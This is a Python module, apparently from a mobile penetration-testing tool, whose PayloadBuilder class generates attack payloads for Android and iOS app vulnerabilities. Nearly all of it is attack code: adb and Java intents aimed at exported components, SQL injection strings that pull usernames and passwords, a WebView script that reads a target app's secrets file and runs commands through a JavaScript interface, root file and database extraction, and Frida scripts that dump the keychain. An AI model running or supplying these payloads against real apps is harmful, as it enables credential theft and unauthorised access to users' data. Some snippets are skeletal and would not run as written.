import logging
from typing import Dict, List, Any
from pathlib import Path

class PayloadBuilder:
    def __init__(self):
        self.logger = logging.getLogger(__name__)

    def build_android_payload(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Build Android payload based on vulnerability type"""
        vuln_type = vulnerability.get('type', '')

        payload_builders = {
            'exported_activity': self._build_activity_payload,
            'exported_service': self._build_service_payload,
            'exported_receiver': self._build_receiver_payload,
            'content_provider': self._build_provider_payload,
            'webview_vulnerability': self._build_webview_payload,
            'insecure_storage': self._build_storage_payload,
            'sql_injection': self._build_sql_injection_payload
        }

        builder = payload_builders.get(vuln_type)
        if builder:
            return builder(vulnerability)
        else:
            self.logger.warning(f"No payload builder for vulnerability type: {vuln_type}")
            return None

    def _build_activity_payload(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Build payload for exported activity"""
        component_name = vulnerability.get('component', '')
        package_name = vulnerability.get('package_name', '')

        return {
            'type': 'exported_activity',
            'adb_command': f'adb shell am start -n {component_name}',
            'code': f'''
// Java code to exploit exported activity
Intent intent = new Intent();
intent.setClassName("{package_name}", "{component_name}");
intent.putExtra("admin", true);
intent.putExtra("debug_mode", true);
startActivity(intent);
''',
            'description': 'Launch exported activity with malicious extras'
        }

    def _build_service_payload(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Build payload for exported service"""
        component_name = vulnerability.get('component', '')

        return {
            'type': 'exported_service',
            'adb_command': f'adb shell am startservice -n {component_name}',
            'code': f'''
// Java code to exploit exported service
Intent intent = new Intent();
intent.setClassName("{vulnerability.get('package_name', '')}", "{component_name}");
intent.putExtra("command", "execute_privileged_action");
startService(intent);
''',
            'description': 'Start exported service with malicious command'
        }

    def _build_receiver_payload(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Build payload for exported broadcast receiver"""
        action = vulnerability.get('action', 'CUSTOM_ACTION')

        return {
            'type': 'exported_receiver',
            'adb_command': f'adb shell am broadcast -a {action}',
            'code': f'''
// Java code to exploit broadcast receiver
Intent intent = new Intent("{action}");
intent.putExtra("sensitive_data", "EXTRACT");
sendBroadcast(intent);
''',
            'description': 'Send broadcast to extract sensitive data'
        }

    def _build_provider_payload(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Build payload for content provider"""
        uri = vulnerability.get('uri', '')

        return {
            'type': 'content_provider',
            'adb_command': f'adb shell content query --uri {uri}',
            'code': f'''
// Java code to exploit content provider
Uri uri = Uri.parse("{uri}");

// Query data
Cursor cursor = getContentResolver().query(uri, null, null, null, null);
if (cursor != null) {{
    while (cursor.moveToNext()) {{
        // Extract data
    }}
    cursor.close();
}}

// SQL injection
Uri injectionUri = Uri.parse("{uri}' OR '1'='1");
getContentResolver().query(injectionUri, null, null, null, null);
''',
            'description': 'Query and inject SQL in content provider'
        }

    def _build_webview_payload(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Build payload for WebView vulnerability"""
        return {
            'type': 'webview_vulnerability',
            'javascript': '''
// JavaScript payload for WebView exploitation
function exploit() {
    // Check for JavaScript interfaces
    for (var prop in window) {
        if (window[prop] && typeof window[prop] === 'object') {
            console.log("Found interface: " + prop);
        }
    }
    
    // Try file access
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'file:///data/data/com.target.app/shared_prefs/secrets.xml', false);
    xhr.send();
    console.log(xhr.responseText);
    
    // Execute if interface exists
    if (window.Android) {
        window.Android.execute("id");
    }
}
exploit();
''',
            'description': 'JavaScript payload to exploit WebView'
        }

    def _build_storage_payload(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Build payload for insecure storage"""
        file_path = vulnerability.get('file_path', '')

        return {
            'type': 'insecure_storage',
            'adb_commands': [
                'adb shell',
                'su',
                f'cat {file_path}',
                f'sqlite3 /data/data/com.target.app/databases/app.db "SELECT * FROM users;"'
            ],
            'description': 'Extract data from insecure storage'
        }

    def _build_sql_injection_payload(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Build payload for SQL injection"""
        return {
            'type': 'sql_injection',
            'payloads': [
                "' OR '1'='1",
                "' UNION SELECT 1,2,3--",
                "' OR 1=1--",
                "admin'--",
                "' UNION SELECT username,password FROM users--"
            ],
            'code': '''
// Test SQL injection
String[] payloads = {
    "' OR '1'='1",
    "' UNION SELECT 1,2,3--",
    "' OR 1=1--"
};

for (String payload : payloads) {
    // Test injection
    String query = "SELECT * FROM users WHERE username='" + payload + "'";
    // Execute query
}
''',
            'description': 'SQL injection payloads'
        }

    def build_ios_payload(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Build iOS payload based on vulnerability type"""
        vuln_type = vulnerability.get('type', '')

        payload_builders = {
            'url_scheme': self._build_url_scheme_payload,
            'keychain_access': self._build_keychain_payload,
            'insecure_storage': self._build_ios_storage_payload,
            'weak_crypto': self._build_ios_crypto_payload
        }

        builder = payload_builders.get(vuln_type)
        if builder:
            return builder(vulnerability)
        else:
            self.logger.warning(f"No iOS payload builder for vulnerability type: {vuln_type}")
            return None

    def _build_url_scheme_payload(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Build payload for URL scheme vulnerability"""
        scheme = vulnerability.get('scheme', '')

        return {
            'type': 'url_scheme',
            'urls': [
                f'{scheme}://admin',
                f'{scheme}://debug?enabled=true',
                f'{scheme}://action?do=sensitive_operation'
            ],
            'code': '''
// Swift code to exploit URL scheme
if let url = URL(string: "TARGET_SCHEME://admin") {
    UIApplication.shared.open(url)
}
''',
            'description': 'Exploit custom URL scheme'
        }

    def _build_keychain_payload(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Build payload for keychain access"""
        return {
            'type': 'keychain_access',
            'frida_script': '''
// Dump keychain items
var query = {
    kSecClass: kSecClassGenericPassword,
    kSecReturnData: true,
    kSecReturnAttributes: true,
    kSecMatchLimit: kSecMatchLimitAll
};

var result = SecItemCopyMatching(query);
console.log(result);
''',
            'description': 'Access keychain items'
        }

    def _build_ios_storage_payload(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Build payload for iOS insecure storage"""
        return {
            'type': 'insecure_storage',
            'paths': [
                '/var/mobile/Containers/Data/Application/[APP_ID]/Documents/',
                '/var/mobile/Containers/Data/Application/[APP_ID]/Library/Preferences/',
                '/var/mobile/Containers/Data/Application/[APP_ID]/Library/Caches/'
            ],
            'commands': [
                'find /var/mobile/Containers/Data/Application/ -name "*.plist"',
                'sqlite3 /path/to/database.db ".dump"'
            ],
            'description': 'Access insecurely stored data'
        }

    def _build_ios_crypto_payload(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Build payload for weak crypto"""
        return {
            'type': 'weak_crypto',
            'frida_script': '''
// Hook crypto functions
Interceptor.attach(Module.findExportByName(null, 'CCCrypt'), {
    onEnter: function(args) {
        console.log('CCCrypt called');
        console.log('Algorithm: ' + args[1]);
        console.log('Options: ' + args[2]);
    }
});
''',
            'description': 'Monitor cryptographic operations'
        }